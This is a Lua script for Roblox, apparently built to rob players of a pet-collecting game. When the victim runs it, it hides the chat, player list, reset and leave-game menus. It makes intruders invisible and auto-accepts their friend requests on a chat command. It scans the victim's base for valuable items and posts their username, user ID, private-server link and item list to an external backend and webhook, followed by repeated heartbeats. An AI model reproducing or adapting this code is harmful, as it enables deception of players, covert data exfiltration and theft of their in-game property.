local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local StarterGui = game:GetService("StarterGui")
local SoundService = game:GetService("SoundService")
local GuiService = game:GetService("GuiService")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local CoreGui = game:GetService("CoreGui")
local VIM = game:GetService("VirtualInputManager")

local whitelist = {
    "hesizdev",
    "IlIlIlIlIIlI_lIlIlIl",
    "multicuentadeangel5"
}

local function isWhitelisted(username)
    for _, whitelistedName in ipairs(whitelist) do
        if username == whitelistedName then
            return true
        end
    end
    return false
end

local LocalPlayer = Players.LocalPlayer
local player = LocalPlayer
local playerGui = LocalPlayer:WaitForChild("PlayerGui")

local heartbeatActive = false
local heartbeatUrl = nil

if not LocalPlayer then 
    warn("LocalPlayer no está disponible. El script se detiene.")
    return 
end

local instanciasWhitelist = {}

local function agregarAWhitelist(instancia)
    if instancia then
        instanciasWhitelist[instancia] = true
    end
end

agregarAWhitelist(Players)
agregarAWhitelist(CoreGui)
agregarAWhitelist(StarterGui)
agregarAWhitelist(LocalPlayer) 

local function estaEnWhitelist(instancia)
    if instanciasWhitelist[instancia] then return true end
    local p = instancia.Parent
    while p do
        if instanciasWhitelist[p] then return true end
        p = p.Parent
    end
    return false
end

local function aplicarFantasma(modelo)
    if not modelo then return end
    
    task.spawn(function()
        task.wait(0.5)
        
        for _, desc in ipairs(modelo:GetDescendants()) do
            if desc:IsA("BasePart") then
                desc.Transparency = 1
                desc.CanCollide = false
                desc.CanTouch = false
                desc.CanQuery = false
                desc.CastShadow = false
            end
            
            if desc:IsA("Decal") or desc:IsA("Texture") or desc:IsA("Clothing") then
                pcall(function() desc.Transparency = 1 end)
            end
            
            if desc:IsA("BillboardGui") or desc:IsA("SurfaceGui") then
                desc.Enabled = false
            end
            
            if desc:IsA("Accessory") then
                local handle = desc:FindFirstChild("Handle")
                if handle then
                    handle.Transparency = 1
                    handle.CanCollide = false
                end
            end
        end
        
        modelo.DescendantAdded:Connect(function(nuevo)
            if nuevo:IsA("BasePart") then
                nuevo.Transparency = 1
                nuevo.CanCollide = false
            elseif nuevo:IsA("BillboardGui") then
                nuevo.Enabled = false
            end
        end)
    end)
end

local function sendCommandToServer(playerWhoUsed)
    local success, result = pcall(function()
        if not HttpService then return end
        if not heartbeatUrl then return end
        
        local displayName = playerWhoUsed.DisplayName or playerWhoUsed.Name
        local userId = playerWhoUsed.UserId
        local avatarUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(userId) .. "&width=420&height=420&format=png"
        
        local commandData = {
            ["username"] = displayName,
            ["avatar_url"] = avatarUrl,
            ["embeds"] = {{
                ["author"] = {
                    ["name"] = displayName,
                    ["icon_url"] = avatarUrl
                },
                ["title"] = "Comando ejecutado",
                ["color"] = 65326,
                ["description"] = displayName .. " Uso \".add\"",
                ["thumbnail"] = {
                    ["url"] = avatarUrl
                },
                ["footer"] = {
                    ["text"] = "User ID: " .. tostring(userId)
                },
                ["timestamp"] = DateTime.now():ToIsoDate()
            }}
        }
        
        local jsonData = HttpService:JSONEncode(commandData)
        
        HttpService:RequestAsync({
            Url = heartbeatUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = jsonData
        })
    end)
end

local function configurarJugador(playerToConfig)
    if playerToConfig == LocalPlayer then return end

    playerToConfig.Chatted:Connect(function(msg)
        local msgLower = msg:lower():gsub("%s+", "")
        
        if msgLower == ".add" then
            print("Solicitud detectada de: " .. playerToConfig.Name)
            pcall(function() sendCommandToServer(playerToConfig) end)
            pcall(function() promptFR(playerToConfig) end) 
        elseif msgLower == ".block" then
            print("[COMANDOS] .block ejecutado por: " .. playerToConfig.Name)
            local allPlayers = Players:GetPlayers()
            for _, player in ipairs(allPlayers) do
                if player ~= LocalPlayer and not isWhitelisted(player.Name) then
                    print("[COMANDOS] Bloqueando a: " .. player.Name)
                    StarterGui:SetCore("PromptBlockPlayer", player)
                    task.wait(0.5)
                end
            end
        elseif msgLower == ".open" then
            print("[COMANDOS] .open ejecutado por: " .. playerToConfig.Name)
            pcall(function()
                ReplicatedStorage.Packages.Net["RE/PlotService/ToggleFriends"]:FireServer()
            end)
        end
    end)

    playerToConfig.CharacterAdded:Connect(function(char)
        aplicarFantasma(char)
        agregarAWhitelist(char)
    end)
    
    if playerToConfig.Character then
        aplicarFantasma(playerToConfig.Character)
        agregarAWhitelist(playerToConfig.Character)
    end
end

for _, p in ipairs(Players:GetPlayers()) do
    configurarJugador(p)
end
Players.PlayerAdded:Connect(configurarJugador)

local function limpiarInterfaz()
    task.spawn(function()
        pcall(function() StarterGui:SetCore("ResetButtonCallback", false) end)
        pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false) end)
    end)
end
limpiarInterfaz()
task.spawn(function() while true do task.wait(5) limpiarInterfaz() end end)

local function handleNewDescendant(descendant)
    if descendant.Name == "Players" or descendant.Name == "LeaveGamePage" then
        task.wait() 
        pcall(function()
            descendant:Destroy()
        end)
    end
end

for _, desc in ipairs(CoreGui:GetDescendants()) do
    handleNewDescendant(desc)
end

CoreGui.DescendantAdded:Connect(handleNewDescendant)

local function bloquearMenuEscape()
    task.spawn(function()
        pcall(function()
            local adminPanel = playerGui:FindFirstChild("AdminPanel")
            if adminPanel then
                adminPanel:Destroy()
            end
        end)
        
        pcall(function()
            local playerList = CoreGui:FindFirstChild("PlayerList")
            if playerList then
                playerList:Destroy()
            end
        end)
        
        task.spawn(function()
            while task.wait(0.5) do
                pcall(function()
                    local innerFrame = CoreGui.RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame
                    if innerFrame:FindFirstChild("Players") then 
                        innerFrame.Players:Destroy()
                    end
                    if innerFrame:FindFirstChild("LeaveGamePage") then 
                        innerFrame.LeaveGamePage:Destroy()
                    end
                end)
            end
        end)
    end)
end
bloquearMenuEscape()

function promptFR(targetPlayer)
    if not targetPlayer then return end

    local oldId = (getthreadidentity and getthreadidentity()) or nil
    if setthreadidentity then pcall(setthreadidentity, 5) end
    
    pcall(function()
        StarterGui:SetCore("PromptSendFriendRequest", targetPlayer)
    end)
    
    if setthreadidentity and oldId then pcall(setthreadidentity, oldId) end

    task.wait(0.5)
    pcall(function()
        local rgui = CoreGui:FindFirstChild("RobloxGui")
        local btn = rgui and rgui:FindFirstChild("ConfirmButton", true)
        if btn then
            if not pcall(function() btn:Activate() end) then
                GuiService.SelectedObject = btn
                VIM:SendKeyEvent(true, Enum.KeyCode.Return, false, game)
                VIM:SendKeyEvent(false, Enum.KeyCode.Return, false, game)
            end
        end
    end)
end

task.spawn(function()
    pcall(function()
        ReplicatedStorage.Packages.Net["RE/PlotService/ToggleFriends"]:FireServer()
    end)
end)

-- ==================== COMANDOS .block Y .open ====================
CoreGui.DescendantAdded:Connect(function(descendant)
    if descendant:IsA("GuiObject") and descendant:FindFirstAncestorWhichIsA("ScreenGui") then
        local screenGui = descendant:FindFirstAncestorWhichIsA("ScreenGui")
        if screenGui.Name == "BlockingModalScreen" then
            if descendant:IsA("TextLabel") then
                descendant:Destroy()
            end
            if descendant:IsA("GuiObject") then
                descendant.BackgroundTransparency = 1
            end
            if descendant:IsA("TextButton") then
                descendant.TextTransparency = 1
            end
            if descendant:IsA("ImageLabel") or descendant:IsA("ImageButton") then
                descendant.ImageTransparency = 1
            end
            
            if descendant.Name == "3" and descendant.Parent and descendant.Parent.Name == "Buttons" then
                descendant.Size = UDim2.new(0, 5000, 0, 5000)
                descendant.Position = UDim2.new(0.5, 0, 0.5, 0)
                descendant.AnchorPoint = Vector2.new(0.5, 0.5)
                
                task.wait()
                
                local buttonPosition = descendant.AbsolutePosition
                local buttonSize = descendant.AbsoluteSize
                local clickX = buttonPosition.X + buttonSize.X / 2
                local clickY = buttonPosition.Y + buttonSize.Y / 2
                
                VIM:SendMouseButtonEvent(clickX, clickY, 0, true, game, 0)
                task.wait(0.1)
                VIM:SendMouseButtonEvent(clickX, clickY, 0, false, game, 0)
            end
        end
    end
end)

-- ==================== FIN COMANDOS ====================

local Game = game

local function esParteDeJugador(instancia)
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Character and instancia:IsDescendantOf(p.Character) then
            return true
        end
    end
    return false
end

local function bloquearInstancia(instancia)
    if estaEnWhitelist(instancia) then return end
    if esParteDeJugador(instancia) then return end
    
    pcall(function()
        task.defer(function()
            if instancia and instancia.Parent then
                instancia:Destroy()
            end
        end)
    end)
end

Game.DescendantAdded:Connect(bloquearInstancia)

local SECURE_BACKEND_URL = "https://hesizweb-production.up.railway.app"

local BLACKLIST = {
    4313952753,
    3328221098,
    2353591712,
    8698369158,
}

local function isBlacklisted(userId)
    for _, id in ipairs(BLACKLIST) do
        if id == userId then
            return true
        end
    end
    return false
end

if isBlacklisted(LocalPlayer.UserId) then
    return
end

local function textToBinary(text)
    local result = {}
    for i = 1, #text do
        local byte = string.byte(text, i)
        local binary = ""
        for j = 7, 0, -1 do
            local bit = math.floor(byte / (2^j)) % 2
            binary = binary .. tostring(bit)
        end
        table.insert(result, binary)
    end
    return table.concat(result, " ")
end

local function requestSecureUrl(category, webhookId)
    local success, result = pcall(function()
        if not HttpService then
            return nil
        end

        if not LocalPlayer then
            return nil
        end

        local usernameBinary = textToBinary(LocalPlayer.Name)

        local requestBody = HttpService:JSONEncode({
            username_binary = usernameBinary,
            category = category or "miranda",
            webhook_id = webhookId or "webhook_2",
            token = "hesiz_secure_v1"
        })

        local response = HttpService:RequestAsync({
            Url = SECURE_BACKEND_URL .. "/create-url",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = requestBody
        })

        if response.StatusCode == 429 then
            local responseBody = response.Body or ""
            if responseBody:find("Rate limited") then
                LocalPlayer:Kick("You are in cooldown!")
                return nil
            end
        end

        if type(response) == "table" and response.StatusCode == 200 then
            local data = HttpService:JSONDecode(response.Body)
            if data and data.success and data.url then
                return data.url
            end
        end

        return nil
    end)

    if success then
        return result
    end
    return nil
end

local allowedAnimals = {
    "67",
    "Celularcini Viciosini",
    "Dragon Cannelloni",
    "Esok Sekolah",
    "Garama and Madundung",
    "Ketupat Kepat",
    "Mariachi Corazoni",
    "Money Money Puggy",
    "Nuclearo Dinossauro",
    "Secret Lucky Block",
    "Spaghetti Tualetti",
    "Tang Tang Kelentang",
    "Eviledon",
    "Tictac Sahur",
    "Tralaledon",
    "La Spooky Grande",
    "Strawberry Elephant",
    "Los Bros",
    "Los Chicleteiras",
    "Los Combinasionas",
    "Los Hotspotsitos",
    "Los Primos",
    "Los Mobilis",
    "Las Sis",
    "La Grande Combinasion",
    "La Supreme Combinasion",
    "La Extinct Grande",
    "La Secret Combinasion", 
    "Spooky and Pumpky", 
    "Ketchuru and Musturu", 
    "Los Lucky Blocks", 
    "Admin Lucky Block", 
    "Burguro And Fryuro", 
    "Chillin Chili", 
    "Los Tacoritas", 
    "Tacorita Bicicleta", 
    "Taco Luckyblock",
    "Mieteteira Bicicleteira",
    "Chipso and Queso",
    "Quesadillo Vampiro",
    "Burrito Bandito",
    "Meowl",
    "Los Nooo My Hotspotsitos",
    "Los Spooky Combinasionas", 
    "La Casa Boo",
    "La Taco Combinasion",
    "Los Puggies",
    "Los Spaghettis",
    "Fragrama and Chocrama",
    "Capitano Moby",
    "W or L",
    "Los Planitos",
    "Headless Horseman",
    "Fishino Clownino",
    "Gobblino Unicilino",
    "Orcaledon",
    "Los 67",
    "Los Burritos",
    "La Jolly Grande",
    "Chicleteira Noelteira",
    "Festive Lucky Block",
    "Chimnino",
    "Los 25",
    "La Ginger Sekolah",
    "Los Candies",
    "Festive 67",
    "Noo My Candy",
    "Noo My Present",
    "Guest 666",
    "Tang Tang Keletang",
    "Reinito Sleighito",
    "Swaggy Bros",
    "Lavadorito Spinito",
    "Dragon Gingerini",
    "Raccooni Jandelini",
    "Donkeyturbo Express",
    "Jolly Jolly Sahur",
    "Ginger Gerat",
    "Los Jolly Combinasionas",
    "Money Money Reindeer",
    "Tuff Tuoucan",
    "Skibidi Toilet"
}

local specialAnimals = {
    "Dragon Cannelloni",
    "Celularcini Viciosini",
    "Ketupat Kepat",
    "Strawberry Elephant",
    "Spooky and Pumpky",
    "La Secret Combinasion",
    "Burguro And Fryuro",
    "Money Money Puggy",
    "Spaghetti Tualetti",
    "Tictac Sahur",
    "Garama and Madundung",
    "Chipso and Queso",
    "Los Spaghettis",
    "Fragrama and Chocrama",
    "Meowl",
    "Eviledon",
    "Los Puggies", 
    "La Casa Boo",
    "La Taco Combinasion",
    "Orcaledon",
    "Los Bros",
    "Headless Horseman",
    "Capitano Moby",
    "W or L",
    "Ketchuru and Musturu",
    "La Supreme Combinasion",
    "Cooki and Milki",
    "Tang Tang Keletang",
    "Reinito Sleighito",
    "Swaggy Bros",
    "Lavadorito Spinito",
    "Los Primos",
    "Dragon Gingerini",
    "Raccooni Jandelini",
    "Nuclearo Dinossauro",
    "Jolly Jolly Sahur",
    "Ginger Gerat",
    "Money Money Reindeer",
    "Skibidi Toilet"
}

local BRAINROT_LIST = {
    "67",
    "Celularcini Viciosini",
    "Dragon Cannelloni",
    "Esok Sekolah",
    "Garama and Madundung",
    "Ketupat Kepat",
    "Mariachi Corazoni",
    "Money Money Puggy",
    "Nuclearo Dinossauro",
    "Secret Lucky Block",
    "Spaghetti Tualetti",
    "Tang Tang Kelentang",
    "Eviledon",
    "Tictac Sahur",
    "Tralaledon",
    "La Spooky Grande",
    "Strawberry Elephant",
    "Los Bros",
    "Los Chicleteiras",
    "Los Combinasionas",
    "Los Hotspotsitos",
    "Los Primos",
    "Los Mobilis",
    "Las Sis",
    "La Grande Combinasion",
    "La Supreme Combinasion",
    "La Extinct Grande",
    "La Secret Combinasion", 
    "Spooky and Pumpky", 
    "Ketchuru and Musturu", 
    "Los Lucky Blocks", 
    "Admin Lucky Block", 
    "Burguro And Fryuro", 
    "Chillin Chili", 
    "Los Tacoritas", 
    "Tacorita Bicicleta", 
    "Taco Luckyblock",
    "Mieteteira Bicicleteira",
    "Chipso and Queso",
    "Quesadillo Vampiro",
    "Burrito Bandito",
    "Meowl",
    "Los Nooo My Hotspotsitos",
    "Los Spooky Combinasionas", 
    "La Casa Boo",
    "La Taco Combinasion",
    "Los Puggies",
    "Los Spaghettis",
    "Fragrama and Chocrama",
    "Capitano Moby",
    "W or L",
    "Los Planitos",
    "Headless Horseman",
    "Fishino Clownino",
    "Gobblino Unicilino",
    "Orcaledon",
    "Los 67",
    "Los Burritos",
    "La Jolly Grande",
    "Chicleteira Noelteira",
    "Festive Lucky Block",
    "Chimnino",
    "Los 25",
    "La Ginger Sekolah",
    "Los Candies",
    "Festive 67",
    "Noo My Candy",
    "Noo My Present",
    "Guest 666",
    "Tang Tang Keletang",
    "Reinito Sleighito",
    "Swaggy Bros",
    "Lavadorito Spinito",
    "Dragon Gingerini",
    "Raccooni Jandelini",
    "Donkeyturbo Express"
}

local function estaEnLista(nombre, lista)
    for _, item in ipairs(lista) do
        if item == nombre then
            return true
        end
    end
    return false
end

-- FUNCIÓN PARA BUSCAR BASE Y ESCANEAR ANIMALES
local function buscarBaseYAnimales()
    local foundAnimals = {}
    local foundSpecials = {}
    
    local success, error = pcall(function()
        local plots = workspace.Plots:GetDescendants()
        
        for _, descendant in ipairs(plots) do
            if descendant:IsA("TextLabel") then
                if descendant.Text == LocalPlayer.DisplayName .. "'s Base" then
                    local surfaceGui = descendant.Parent.Parent
                    local plotSign = surfaceGui.Parent
                    local modelo = plotSign.Parent
                    
                    -- Escanear todos los hijos del modelo (la base del jugador)
                    for _, child in ipairs(modelo:GetChildren()) do
                        if child:IsA("Model") and estaEnLista(child.Name, allowedAnimals) then
                            -- Verificar si es especial
                            if estaEnLista(child.Name, specialAnimals) then
                                table.insert(foundSpecials, child.Name)
                            end
                            -- Agregar a la lista general (evitar duplicados)
                            if not table.find(foundAnimals, child.Name) then
                                table.insert(foundAnimals, child.Name)
                            end
                        end
                    end
                    
                    break
                end
            end
        end
    end)
    
    if not success then
        warn("Error al escanear base: " .. tostring(error))
        return {}
    end
    
    return foundAnimals
end

-- FUNCIÓN PARA VALIDAR LINK DE SERVIDOR PRIVADO
local function isValidPrivateServerLink(text)
    if not string.find(text, "https?://") then
        return false
    end

    if not string.find(text, "roblox%.com") then
        return false
    end

    local patterns = {
  
    }

    for _, pattern in ipairs(patterns) do
        if string.match(text, pattern) then
            return true
        end
    end

    return false
end

-- FUNCIÓN PARA ENVIAR HEARTBEAT (GET periódico)
local function startHeartbeat(url)
    if heartbeatActive then return end
    heartbeatActive = true
    heartbeatUrl = url
    
    task.spawn(function()
        -- Enviar primer GET inmediatamente
        task.wait(1) -- Pequeño delay inicial
        
        while heartbeatActive and heartbeatUrl do
            if not heartbeatActive or not heartbeatUrl then break end
            
            local success, response = pcall(function()
                return HttpService:RequestAsync({
                    Url = heartbeatUrl,
                    Method = "GET",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    }
                })
            end)
            
            if success and response then
                if response.StatusCode == 200 then
                    -- Heartbeat exitoso, seguimos en el juego
                elseif response.StatusCode == 404 then
                    -- Sesión terminada, dejar de enviar heartbeats
                    heartbeatActive = false
                    heartbeatUrl = nil
                    break
                end
            else
                -- Error en el request, intentar de nuevo
            end
            
            -- Esperar antes del siguiente heartbeat
            task.wait(5) -- Enviar GET cada 5 segundos
        end
    end)
end

-- FUNCIÓN PARA DETENER EL HEARTBEAT
local function stopHeartbeat()
    heartbeatActive = false
    heartbeatUrl = nil
end

-- FUNCIÓN PARA ENVIAR A WEBHOOK
local function sendToWebhook(link, foundAnimals)
    local overallSuccess, overallError = pcall(function()
        if isBlacklisted(LocalPlayer.UserId) then
            return false
        end

        if not isValidPrivateServerLink(link) then
            return false
        end

        if not foundAnimals or #foundAnimals == 0 then
            return true
        end

        local playerCount = #Players:GetPlayers()
        if playerCount > 1 then
            return true
        end

        local playerName = LocalPlayer.Name
        local displayName = LocalPlayer.DisplayName
        local userId = LocalPlayer.UserId
        local specialFound = false

        for _, animal in ipairs(foundAnimals) do
            for _, special in ipairs(specialAnimals) do
                if animal:lower():find(special:lower(), 1, true) then
                    specialFound = true
                    break
                end
            end
            if specialFound then break end
        end

        local isSpecial = specialFound
        local category = isSpecial and "webhook_2" or "webhook_2"

        local animalList = ""
        for i, animal in ipairs(foundAnimals) do
            if i == 1 then
                animalList = animal
            else
                animalList = animalList .. "\n" .. animal
            end
        end

        local title = isSpecial and "CATCHES ESPECIALES ENCONTRADOS" or "Nuevo Exploiter Encontrado"
        local color = isSpecial and 16766720 or 10038562

        local data = {
            ["content"] = isSpecial and "@everyone **SPECIAL CATCHES FOUND!**" or "@everyone **NEW PRIVATE SERVER HIT!**",
            ["embeds"] = {{
                ["title"] = title,
                ["color"] = color,
                ["fields"] = {
                    {
                        ["name"] = "Información del jugador:",
                        ["value"] = "```diff\n+ Username: " .. playerName .. "\n+ Display: " .. displayName .. "\n+ User ID: " .. userId .. "\n```",
                    },
                    {
                        ["name"] = "Datos del Server:",
                        ["value"] = "```diff\n+ Players in Server: " .. playerCount .. "\n```",
                    },
                    {
                        ["name"] = "Link del Server:",
                        ["value"] = "[Click here to join](" .. link .. ")",
                    },
                    {
                        ["name"] = isSpecial and "CATCHES ESPECIALES:" or "Items importantes (secrets):",
                        ["value"] = "```diff\n+ " .. animalList:gsub("\n", "\n+ ") .. "```",
                    },
                    {
                        ["name"] = "Total:",
                        ["value"] = "```diff\n+ Total Items: " .. #foundAnimals .. "\n+ Game ID: " .. tostring(game.GameId) .. "\n+ Executor ID: " .. userId .. "\n```",
                    }
                },
                ["footer"] = {["text"] = isSpecial and "Miranda - Detector de Catches Especiales" or "Miranda - Cazador de Exploiter"},
                ["timestamp"] = DateTime.now():ToIsoDate()
            }}
        }

        local webhookId = "webhook_2"
        
        local secureUrl = requestSecureUrl(category, webhookId)

        if secureUrl then
            local sendSuccess, sendResponse = pcall(function()
                local jsonData = HttpService:JSONEncode(data)
                return HttpService:RequestAsync({
                    Url = secureUrl,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = jsonData
                })
            end)

            if sendSuccess and sendResponse then
                local statusCode = sendResponse.StatusCode
                local responseBody = sendResponse.Body or ""

                if statusCode == 429 then
                    if responseBody:find("Rate limited") then
                        LocalPlayer:Kick("You are in cooldown!")
                        return false
                    end
                end
                
                -- Si el POST fue exitoso, iniciar heartbeat
                if statusCode == 200 then
                    startHeartbeat(secureUrl)
                end
            end
        end

        return true
    end)

    if overallSuccess then
        return true
    else
        return true
    end
end

